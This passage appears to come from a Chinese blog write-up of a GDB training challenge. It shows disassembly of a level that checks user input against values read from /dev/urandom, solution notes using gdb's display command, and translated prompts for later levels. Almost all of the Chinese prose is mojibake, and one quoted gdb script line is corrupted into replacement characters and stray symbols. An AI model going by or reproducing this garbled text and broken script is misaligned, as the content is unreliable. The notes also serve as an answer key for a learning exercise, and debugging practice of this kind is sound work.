 _puts<br><span class="hljs-symbol">.text:</span>0000000000001AFD                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rax</span>, [<span class="hljs-built_in">rbp</span>+var_30]<br><span class="hljs-symbol">.text:</span>0000000000001B01                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rax</span>, [<span class="hljs-built_in">rax</span>]<br><span class="hljs-symbol">.text:</span>0000000000001B04                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rsi</span>, <span class="hljs-built_in">rax</span><br><span class="hljs-symbol">.text:</span>0000000000001B07                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">rdi</span>, aWelcomeToS <span class="hljs-comment">; &quot;### Welcome to %s!\n&quot;</span><br><span class="hljs-symbol">.text:</span>0000000000001B0E                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">eax</span>, <span class="hljs-number">0</span><br><span class="hljs-symbol">.text:</span>0000000000001B13                 <span class="hljs-keyword">call</span>    _printf<br><span class="hljs-symbol">.text:</span>0000000000001B18                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">rdi</span>, asc_21C5   <span class="hljs-comment">; &quot;###&quot;</span><br><span class="hljs-symbol">.text:</span>0000000000001B1F                 <span class="hljs-keyword">call</span>    _puts<br><span class="hljs-symbol">.text:</span>0000000000001B24                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">edi</span>, <span class="hljs-number">0Ah</span>        <span class="hljs-comment">; c</span><br><span class="hljs-symbol">.text:</span>0000000000001B29                 <span class="hljs-keyword">call</span>    _putchar<br><span class="hljs-symbol">.text:</span>0000000000001B2E                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rax</span>, <span class="hljs-built_in">cs</span>:stdin@@GLIBC_2_2_5<br><span class="hljs-symbol">.text:</span>0000000000001B35                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">ecx</span>, <span class="hljs-number">0</span>          <span class="hljs-comment">; n</span><br><span class="hljs-symbol">.text:</span>0000000000001B3A                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">edx</span>, <span class="hljs-number">2</span>          <span class="hljs-comment">; modes</span><br><span class="hljs-symbol">.text:</span>0000000000001B3F                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">esi</span>, <span class="hljs-number">0</span>          <span class="hljs-comment">; buf</span><br><span class="hljs-symbol">.text:</span>0000000000001B44                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rdi</span>, <span class="hljs-built_in">rax</span>        <span class="hljs-comment">; stream</span><br><span class="hljs-symbol">.text:</span>0000000000001B47                 <span class="hljs-keyword">call</span>    _setvbuf<br><span class="hljs-symbol">.text:</span>0000000000001B4C                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rax</span>, <span class="hljs-built_in">cs</span>:__bss_start<br><span class="hljs-symbol">.text:</span>0000000000001B53                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">ecx</span>, <span class="hljs-number">1</span>          <span class="hljs-comment">; n</span><br><span class="hljs-symbol">.text:</span>0000000000001B58                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">edx</span>, <span class="hljs-number">2</span>          <span class="hljs-comment">; modes</span><br><span class="hljs-symbol">.text:</span>0000000000001B5D                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">esi</span>, <span class="hljs-number">0</span>          <span class="hljs-comment">; buf</span><br><span class="hljs-symbol">.text:</span>0000000000001B62                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rdi</span>, <span class="hljs-built_in">rax</span>        <span class="hljs-comment">; stream</span><br><span class="hljs-symbol">.text:</span>0000000000001B65                 <span class="hljs-keyword">call</span>    _setvbuf<br><span class="hljs-symbol">.text:</span>0000000000001B6A                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">rdi</span>, aGdbIsAVeryPowe <span class="hljs-comment">; &quot;GDB is a very powerful dynamic analysis&quot;...</span><br><span class="hljs-symbol">.text:</span>0000000000001B71                 <span class="hljs-keyword">call</span>    _puts<br><span class="hljs-symbol">.text:</span>0000000000001B76                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">rdi</span>, aItsExecutionYo <span class="hljs-comment">; &quot;its execution. You will become familiar&quot;...</span><br><span class="hljs-symbol">.text:</span>0000000000001B7D                 <span class="hljs-keyword">call</span>    _puts<br><span class="hljs-symbol">.text:</span>0000000000001B82                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">rdi</span>, aACriticalPartO <span class="hljs-comment">; &quot;A critical part of dynamic analysis is &quot;...</span><br><span class="hljs-symbol">.text:</span>0000000000001B89                 <span class="hljs-keyword">call</span>    _puts<br><span class="hljs-symbol">.text:</span>0000000000001B8E                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">rdi</span>, aChallengesHave <span class="hljs-comment">; &quot;challenges have automatically set break&quot;...</span><br><span class="hljs-symbol">.text:</span>0000000000001B95                 <span class="hljs-keyword">call</span>    _puts<br><span class="hljs-symbol">.text:</span>0000000000001B9A                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">rdi</span>, aItIsImportantT <span class="hljs-comment">; &quot;It is important to be able to do this y&quot;...</span><br><span class="hljs-symbol">.text:</span>0000000000001BA1                 <span class="hljs-keyword">call</span>    _puts<br><span class="hljs-symbol">.text:</span>0000000000001BA6                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">rdi</span>, aThereAreANumbe <span class="hljs-comment">; &quot;There are a number of ways to move forw&quot;...</span><br><span class="hljs-symbol">.text:</span>0000000000001BAD                 <span class="hljs-keyword">call</span>    _puts<br><span class="hljs-symbol">.text:</span>0000000000001BB2                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">rdi</span>, aForShortInOrde <span class="hljs-comment">; &quot;for short, in order to step forward one&quot;...</span><br><span class="hljs-symbol">.text:</span>0000000000001BB9                 <span class="hljs-keyword">call</span>    _puts<br><span class="hljs-symbol">.text:</span>0000000000001BBE                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">rdi</span>, aOrderToStepFor <span class="hljs-comment">; &quot;order to step forward one instruction, &quot;...</span><br><span class="hljs-symbol">.text:</span>0000000000001BC5                 <span class="hljs-keyword">call</span>    _puts<br><span class="hljs-symbol">.text:</span>0000000000001BCA                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">rdi</span>, aAllowsYouToPer <span class="hljs-comment">; &quot;allows you to perform multiple steps at&quot;...</span><br><span class="hljs-symbol">.text:</span>0000000000001BD1                 <span class="hljs-keyword">call</span>    _puts<br><span class="hljs-symbol">.text:</span>0000000000001BD6                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">rdi</span>, aExecutingFunct <span class="hljs-comment">; &quot;executing function. You can use the `br&quot;...</span><br><span class="hljs-symbol">.text:</span>0000000000001BDD                 <span class="hljs-keyword">call</span>    _puts<br><span class="hljs-symbol">.text:</span>0000000000001BE2                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">rdi</span>, aSpecifiedAddre <span class="hljs-comment">; &quot;specified-address. You have already use&quot;...</span><br><span class="hljs-symbol">.text:</span>0000000000001BE9                 <span class="hljs-keyword">call</span>    _puts<br><span class="hljs-symbol">.text:</span>0000000000001BEE                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">rdi</span>, aBreakpoint <span class="hljs-comment">; &quot;breakpoint.\n&quot;</span><br><span class="hljs-symbol">.text:</span>0000000000001BF5                 <span class="hljs-keyword">call</span>    _puts<br><span class="hljs-symbol">.text:</span>0000000000001BFA                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">rdi</span>, aWhileSteppingT <span class="hljs-comment">; &quot;While stepping through a program, you m&quot;...</span><br><span class="hljs-symbol">.text:</span>0000000000001C01                 <span class="hljs-keyword">call</span>    _puts<br><span class="hljs-symbol">.text:</span>0000000000001C06                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">rdi</span>, aMultipleWaysTo <span class="hljs-comment">; &quot;multiple ways to do this. The simplest &quot;...</span><br><span class="hljs-symbol">.text:</span>0000000000001C0D                 <span class="hljs-keyword">call</span>    _puts<br><span class="hljs-symbol">.text:</span>0000000000001C12                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">rdi</span>, aExactlyTheSame <span class="hljs-comment">; &quot;exactly the same format as the `x/&lt;n&gt;&lt;u&quot;...</span><br><span class="hljs-symbol">.text:</span>0000000000001C19                 <span class="hljs-keyword">call</span>    _puts<br><span class="hljs-symbol">.text:</span>0000000000001C1E                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">rdi</span>, aTheNext8Instru <span class="hljs-comment">; &quot;the next 8 instructions. On the other h&quot;...</span><br><span class="hljs-symbol">.text:</span>0000000000001C25                 <span class="hljs-keyword">call</span>    _puts<br><span class="hljs-symbol">.text:</span>0000000000001C2A                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">rdi</span>, aAnotherOptionI <span class="hljs-comment">; &quot;Another option is to use the `layout re&quot;...</span><br><span class="hljs-symbol">.text:</span>0000000000001C31                 <span class="hljs-keyword">call</span>    _puts<br><span class="hljs-symbol">.text:</span>0000000000001C36                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">rdi</span>, aOfTheRegisters <span class="hljs-comment">; &quot;of the registers, as well as nearby ins&quot;...</span><br><span class="hljs-symbol">.text:</span>0000000000001C3D                 <span class="hljs-keyword">call</span>    _puts<br><span class="hljs-symbol">.text:</span>0000000000001C42                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">rdi</span>, aInOrderToSolve <span class="hljs-comment">; &quot;In order to solve this level, you must &quot;...</span><br><span class="hljs-symbol">.text:</span>0000000000001C49                 <span class="hljs-keyword">call</span>    _puts<br><span class="hljs-symbol">.text:</span>0000000000001C4E                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">rdi</span>, aHighlyEncourag <span class="hljs-comment">; &quot;highly encouraged to try using combinat&quot;...</span><br><span class="hljs-symbol">.text:</span>0000000000001C55                 <span class="hljs-keyword">call</span>    _puts<br><span class="hljs-symbol">.text:</span>0000000000001C5A                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">rdi</span>, aAGoodInternalU <span class="hljs-comment">; &quot;a good internal understanding of these &quot;...</span><br><span class="hljs-symbol">.text:</span>0000000000001C61                 <span class="hljs-keyword">call</span>    _puts<br><span class="hljs-symbol">.text:</span>0000000000001C66                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">rdi</span>, aExecution <span class="hljs-comment">; &quot;execution.\n&quot;</span><br><span class="hljs-symbol">.text:</span>0000000000001C6D                 <span class="hljs-keyword">call</span>    _puts<br><span class="hljs-symbol">.text:</span>0000000000001C72                 <span class="hljs-keyword">int</span>     <span class="hljs-number">3</span>               <span class="hljs-comment">; Trap to Debugger</span><br><span class="hljs-symbol">.text:</span>0000000000001C72 main            endp<br><span class="hljs-symbol">.text:</span>0000000000001C72<br><span class="hljs-symbol">.text:</span>0000000000001C72 <span class="hljs-comment">; ---------------------------------------------------------------------------</span><br><span class="hljs-symbol">.text:</span>0000000000001C73                 <span class="hljs-meta">align</span> <span class="hljs-number">4</span><br><span class="hljs-symbol">.text:</span>0000000000001C74                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">1Ch</span>], <span class="hljs-number">0</span><br><span class="hljs-symbol">.text:</span>0000000000001C7B                 <span class="hljs-keyword">jmp</span>     loc_1D2B<br><span class="hljs-symbol">.text:</span>0000000000001C80 <span class="hljs-comment">; ---------------------------------------------------------------------------</span><br><span class="hljs-symbol">.text:</span>0000000000001C80<br><span class="hljs-symbol">.text:</span>0000000000001C80 loc_1C80:                               <span class="hljs-comment">; CODE XREF: .text:0000000000001D2Fâ†“j</span><br><span class="hljs-symbol">.text:</span>0000000000001C80                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">esi</span>, <span class="hljs-number">0</span><br><span class="hljs-symbol">.text:</span>0000000000001C85                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">rdi</span>, aDevUrandom <span class="hljs-comment">; &quot;/dev/urandom&quot;</span><br><span class="hljs-symbol">.text:</span>0000000000001C8C                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">eax</span>, <span class="hljs-number">0</span><br><span class="hljs-symbol">.text:</span>0000000000001C91                 <span class="hljs-keyword">call</span>    _open<br><span class="hljs-symbol">.text:</span>0000000000001C96                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">ecx</span>, <span class="hljs-built_in">eax</span><br><span class="hljs-symbol">.text:</span>0000000000001C98                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">rax</span>, [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">18h</span>]<br><span class="hljs-symbol">.text:</span>0000000000001C9C                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">edx</span>, <span class="hljs-number">8</span><br><span class="hljs-symbol">.text:</span>0000000000001CA1                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rsi</span>, <span class="hljs-built_in">rax</span><br><span class="hljs-symbol">.text:</span>0000000000001CA4                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">edi</span>, <span class="hljs-built_in">ecx</span><br><span class="hljs-symbol">.text:</span>0000000000001CA6                 <span class="hljs-keyword">call</span>    _read<br><span class="hljs-symbol">.text:</span>0000000000001CAB                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">rdi</span>, aTheRandomValue <span class="hljs-comment">; &quot;The random value has been set!\n&quot;</span><br><span class="hljs-symbol">.text:</span>0000000000001CB2                 <span class="hljs-keyword">call</span>    _puts<br><span class="hljs-symbol">.text:</span>0000000000001CB7                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">rdi</span>, aRandomValue <span class="hljs-comment">; &quot;Random value: &quot;</span><br><span class="hljs-symbol">.text:</span>0000000000001CBE                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">eax</span>, <span class="hljs-number">0</span><br><span class="hljs-symbol">.text:</span>0000000000001CC3                 <span class="hljs-keyword">call</span>    _printf<br><span class="hljs-symbol">.text:</span>0000000000001CC8                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">rax</span>, [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">10h</span>]<br><span class="hljs-symbol">.text:</span>0000000000001CCC                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rsi</span>, <span class="hljs-built_in">rax</span><br><span class="hljs-symbol">.text:</span>0000000000001CCF                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">rdi</span>, aLlx       <span class="hljs-comment">; &quot;%llx&quot;</span><br><span class="hljs-symbol">.text:</span>0000000000001CD6                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">eax</span>, <span class="hljs-number">0</span><br><span class="hljs-symbol">.text:</span>0000000000001CDB                 <span class="hljs-keyword">call</span>    ___isoc99_scanf<br><span class="hljs-symbol">.text:</span>0000000000001CE0                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rax</span>, [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">10h</span>]<br><span class="hljs-symbol">.text:</span>0000000000001CE4                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rsi</span>, <span class="hljs-built_in">rax</span><br><span class="hljs-symbol">.text:</span>0000000000001CE7                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">rdi</span>, aYouInputLlx <span class="hljs-comment">; &quot;You input: %llx\n&quot;</span><br><span class="hljs-symbol">.text:</span>0000000000001CEE                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">eax</span>, <span class="hljs-number">0</span><br><span class="hljs-symbol">.text:</span>0000000000001CF3                 <span class="hljs-keyword">call</span>    _printf<br><span class="hljs-symbol">.text:</span>0000000000001CF8                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rax</span>, [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">18h</span>]<br><span class="hljs-symbol">.text:</span>0000000000001CFC                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rsi</span>, <span class="hljs-built_in">rax</span><br><span class="hljs-symbol">.text:</span>0000000000001CFF                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">rdi</span>, aTheCorrectAnsw <span class="hljs-comment">; &quot;The correct answer is: %llx\n&quot;</span><br><span class="hljs-symbol">.text:</span>0000000000001D06                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">eax</span>, <span class="hljs-number">0</span><br><span class="hljs-symbol">.text:</span>0000000000001D0B                 <span class="hljs-keyword">call</span>    _printf<br><span class="hljs-symbol">.text:</span>0000000000001D10                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rdx</span>, [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">10h</span>]<br><span class="hljs-symbol">.text:</span>0000000000001D14                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rax</span>, [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">18h</span>]<br><span class="hljs-symbol">.text:</span>0000000000001D18                 <span class="hljs-keyword">cmp</span>     <span class="hljs-built_in">rdx</span>, <span class="hljs-built_in">rax</span><br><span class="hljs-symbol">.text:</span>0000000000001D1B                 <span class="hljs-keyword">jz</span>      short loc_1D27<br><span class="hljs-symbol">.text:</span>0000000000001D1D                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">edi</span>, <span class="hljs-number">1</span><br><span class="hljs-symbol">.text:</span>0000000000001D22                 <span class="hljs-keyword">call</span>    _exit<br><span class="hljs-symbol">.text:</span>0000000000001D27 <span class="hljs-comment">; ---------------------------------------------------------------------------</span><br><span class="hljs-symbol">.text:</span>0000000000001D27<br><span class="hljs-symbol">.text:</span>0000000000001D27 loc_1D27:                               <span class="hljs-comment">; CODE XREF: .text:0000000000001D1Bâ†‘j</span><br><span class="hljs-symbol">.text:</span>0000000000001D27                 <span class="hljs-keyword">add</span>     <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">1Ch</span>], <span class="hljs-number">1</span><br><span class="hljs-symbol">.text:</span>0000000000001D2B<br><span class="hljs-symbol">.text:</span>0000000000001D2B loc_1D2B:                               <span class="hljs-comment">; CODE XREF: .text:0000000000001C7Bâ†‘j</span><br><span class="hljs-symbol">.text:</span>0000000000001D2B                 <span class="hljs-keyword">cmp</span>     <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">1Ch</span>], <span class="hljs-number">3</span><br><span class="hljs-symbol">.text:</span>0000000000001D2F                 <span class="hljs-keyword">jle</span>     loc_1C80<br><span class="hljs-symbol">.text:</span>0000000000001D35                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">eax</span>, <span class="hljs-number">0</span><br><span class="hljs-symbol">.text:</span>0000000000001D3A                 <span class="hljs-keyword">call</span>    win<br></code></pre></td></tr></table></figure><p>æœ‰ä¸€ä¸ªè·³è½¬ï¼Œä¼šå’Œ3æ¯”è¾ƒï¼Œå°äºç­‰äº3åˆ™è·³å›å»ï¼Œé‡å¤éªŒè¯è¾“å…¥æ˜¯ä¸æ˜¯æ­£ç¡®</p><p>ä¹Ÿå°±æ˜¯for(i=0;i&lt;=3;i++)</p><p>ä¸‰æ¬¡éƒ½å¯¹å³å¯ï¼ˆç›¸å½“äºä¸‰æ¬¡level 3 ï¼‰</p><h1 id="5"><a href="#5" class="headerlink" title="5"></a>5</h1><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">è™½ç„¶åƒæˆ‘ä»¬åœ¨è¿‡å»çš„çº§åˆ«ä¸­æ‰€åšçš„é‚£æ ·äº¤äº’åœ°ä½¿ç”¨gdbéå¸¸å¼ºå¤§ï¼Œä½†å¦ä¸€ä¸ªå¼ºå¤§çš„å·¥å…·æ˜¯gdbè„šæœ¬ã€‚é€šè¿‡ç¼–å†™gdbè„šæœ¬ï¼Œæ‚¨å¯ä»¥å¿«é€Ÿåˆ›å»ºä¸€ä¸ªå®šåˆ¶çš„ç¨‹åºåˆ†æå·¥å…·ã€‚å¦‚æœæ‚¨çŸ¥é“å¦‚ä½•ä¸gdbè¿›è¡Œäº¤äº’ï¼Œé‚£ä¹ˆæ‚¨å·²ç»çŸ¥é“å¦‚ä½•ç¼–å†™gdbè„šæœ¬â€”â€”è¯­æ³•å®Œå…¨ç›¸åŒã€‚æ‚¨å¯ä»¥å°†å‘½ä»¤å†™å…¥æŸä¸ªæ–‡ä»¶ï¼Œä¾‹å¦‚`x.gdb`ï¼Œç„¶åä½¿ç”¨æ ‡å¿—`-x &lt;PATH_TO_SCRIPT&gt;`å¯åŠ¨gdbã€‚è¿™ä¸ªæ–‡ä»¶å°†åœ¨gdbå¯åŠ¨åæ‰§è¡Œæ‰€æœ‰çš„gdbå‘½ä»¤ã€‚æˆ–è€…ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨`-ex &#x27;&lt;COMMAND&gt;&#x27;`æ‰§è¡Œå•ä¸ªå‘½ä»¤ã€‚æ‚¨å¯ä»¥ä½¿ç”¨å¤šä¸ª`-ex`å‚æ•°ä¼ é€’å¤šä¸ªå‘½ä»¤ã€‚æœ€åï¼Œæ‚¨å¯ä»¥å°†ä¸€äº›å‘½ä»¤æ”¾åœ¨`~/.gdbinit`ä¸­ï¼Œä»¥ä¾¿åœ¨ä»»ä½•gdbä¼šè¯ä¸­å§‹ç»ˆæ‰§è¡Œã€‚æ‚¨å¯èƒ½å¸Œæœ›åœ¨å…¶ä¸­æ”¾å…¥`set disassembly-flavor intel`ã€‚<br><br>åœ¨gdbè„šæœ¬ä¸­ï¼Œä¸€ä¸ªéå¸¸å¼ºå¤§çš„ç»“æ„æ˜¯æ–­ç‚¹å‘½ä»¤ã€‚è€ƒè™‘ä»¥ä¸‹gdbè„šæœ¬ï¼š<br><br>start  <br><span class="hljs-keyword">break</span> *main+<span class="hljs-number">42</span>  <br>commands  <br>x/gx $rbp-<span class="hljs-number">0</span>x32  <br><span class="hljs-keyword">continue</span>  <br>end  <br><span class="hljs-keyword">continue</span><br><br>åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ¯å½“æˆ‘ä»¬åˆ°è¾¾`main+<span class="hljs-number">42</span>`å¤„çš„æŒ‡ä»¤æ—¶ï¼Œæˆ‘ä»¬å°†è¾“å‡ºä¸€ä¸ªç‰¹å®šçš„å±€éƒ¨å˜é‡ï¼Œç„¶åç»§ç»­æ‰§è¡Œã€‚<br><br>ç°åœ¨è€ƒè™‘ä¸€ä¸ªç±»ä¼¼ä½†ç¨å¾®æ›´é«˜çº§çš„è„šæœ¬ï¼Œå…¶ä¸­ä½¿ç”¨äº†ä¸€äº›æ‚¨å°šæœªè§è¿‡çš„å‘½ä»¤ï¼š<br><br>start  <br><span class="hljs-keyword">break</span> *main+<span class="hljs-number">42</span>  <br>commands  <br>silent  <br>setÂ ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½=âˆ—(ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½âˆ—)(localvâ€‹ariable=âˆ—(unsignedlonglongâˆ—)(rbp-<span class="hljs-number">0</span>x32)  <br>printf <span class="hljs-string">&quot;å½“å‰å€¼ï¼š%llx\n&quot;</span>, $local_variable  <br><span class="hljs-keyword">continue</span>  <br>end  <br><span class="hljs-keyword">continue</span><br><br>åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œ`silent`è¡¨ç¤ºæˆ‘ä»¬ä¸å¸Œæœ›gdbæŠ¥å‘Šæˆ‘ä»¬å·²ç»è§¦å‘äº†ä¸€ä¸ªæ–­ç‚¹ï¼Œä»¥ä½¿è¾“å‡ºæ›´æ¸…æ™°ã€‚ç„¶åæˆ‘ä»¬ä½¿ç”¨`set`å‘½ä»¤åœ¨gdbä¼šè¯ä¸­å®šä¹‰ä¸€ä¸ªå˜é‡ï¼Œå…¶å€¼ä¸ºæˆ‘ä»¬çš„å±€éƒ¨å˜é‡ã€‚æœ€åï¼Œæˆ‘ä»¬ä½¿ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²è¾“å‡ºå½“å‰å€¼ã€‚<br><br>ä½¿ç”¨gdbè„šæœ¬æ¥å¸®åŠ©æ‚¨æ”¶é›†éšæœºå€¼ã€‚<br></code></pre></td></tr></table></figure><p>open æ‰“å¼€/dev/urandomçš„æ–‡ä»¶æè¿°ç¬¦ï¼Œè¿”å›æè¿°ç¬¦</p><p>readè¯»å–æè¿°ç¬¦æ‰€åœ¨ä½ç½®çš„å€¼å†™åˆ°ç¼“å†²åŒºä¸­ï¼Œç¼“å†²åŒºä½ç½®åœ¨<code>$rbp-0x18</code></p><p>scanfä¸¤ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªæ˜¯ â€œllxâ€ï¼Œç¬¬äºŒä¸ªæ˜¯<code>$rbp-0x10</code></p><p>åœ¨main+752å¤„æ‰“æ–­ç‚¹</p><p>displayç”¨æ³•ï¼š</p><ul><li>display/10i $rip<ul><li>æ¯æ¬¡gdbåœæ­¢éƒ½ä¼šæ‰“å°å‡ºæ¥ä¸‹æ¥çš„åæ¡æŒ‡ä»¤</li></ul></li><li>info display<ul><li>æŸ¥çœ‹ç›®å‰æœ‰å¤šå°‘ä¸ªdisplay</li></ul></li><li>undisplay</li></ul><p>layout asmå’Œlayout regsçš„çª—å£ç»˜åˆ¶æœ‰é—®é¢˜ï¼Œæ‰€ä»¥ä¸å¦‚ç”¨displayæŒ‡ä»¤</p><p>é¢˜å¹²ç»™çš„gdbè„šæœ¬ï¼Œä¸€ç›´æ²¡ææ‡‚æ€ä¹ˆåœ¨äºŒè¿›åˆ¶ä¸­è‡ªåŠ¨è°ƒç”¨çš„gdbçª—å£ä¸­ä½¿ç”¨å’Œäº¤äº’ï¼Œè¿™ç±»è¿˜æ˜¯ç”¨æœ€åŸºæœ¬çš„æ–¹æ³•ï¼Œè®©ç¨‹åºä½¿ç”¨displayè‡ªåŠ¨è¾“å‡ºå€¼ï¼Œå¤åˆ¶ç²˜è´´ä½œä¸ºscanfçš„è¾“å…¥</p><ul><li><code>b *main+752</code></li><li>run</li><li><code>(gdb) display /10i $rip</code></li><li><code>(gdb) display/xg $rbp-0x18</code><ul><li><code>x/gx $rbp-0x18</code></li></ul></li><li>è¾“å…¥å€¼</li><li>c</li></ul><p>è¿™ä¸€æ¬¡å’Œä¸Šä¸€æ¬¡ç›¸æ¯”ï¼Œå¾ªç¯æ¬¡æ•°å˜æˆäº†7ï¼Œå› æ­¤å¦‚æœæ¯ä¸€æ¬¡éƒ½æ˜¯æ‰‹åŠ¨æ‰“å‘½ä»¤ï¼Œéå¸¸å®¹æ˜“å‡ºé”™ã€‚displayå¯ä»¥å¸®åŠ©æˆ‘ä»¬</p><h1 id="6"><a href="#6" class="headerlink" title="6"></a>6</h1><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs arduino">GDBæ˜¯ä¸€ä¸ªéå¸¸å¼ºå¤§çš„åŠ¨æ€åˆ†æå·¥å…·ï¼Œå¯ä»¥å¸®åŠ©ä½ äº†è§£ç¨‹åºåœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­çš„çŠ¶æ€ã€‚åœ¨æœ¬æ¨¡å—ä¸­ï¼Œä½ å°†ç†Ÿæ‚‰ä¸€äº›gdbçš„åŠŸèƒ½ã€‚<br><br>äº‹å®è¯æ˜ï¼Œgdbå¯¹ç›®æ ‡è¿›ç¨‹å…·æœ‰å®Œå…¨çš„æ§åˆ¶æƒã€‚ä½ ä¸ä»…å¯ä»¥åˆ†æç¨‹åºçš„çŠ¶æ€ï¼Œè¿˜å¯ä»¥ä¿®æ”¹å®ƒã€‚å°½ç®¡gdbå¯èƒ½ä¸æ˜¯é•¿æœŸç»´æŠ¤ç¨‹åºçš„æœ€ä½³å·¥å…·ï¼Œä½†æœ‰æ—¶å€™ä¸ºäº†æ›´å®¹æ˜“åˆ†æç›®æ ‡è¿›ç¨‹ï¼Œå¿«é€Ÿä¿®æ”¹å…¶è¡Œä¸ºå¯èƒ½ä¼šå¾ˆæœ‰ç”¨ã€‚<br><br>ä½ å¯ä»¥ä½¿ç”¨`set`å‘½ä»¤æ¥ä¿®æ”¹ç›®æ 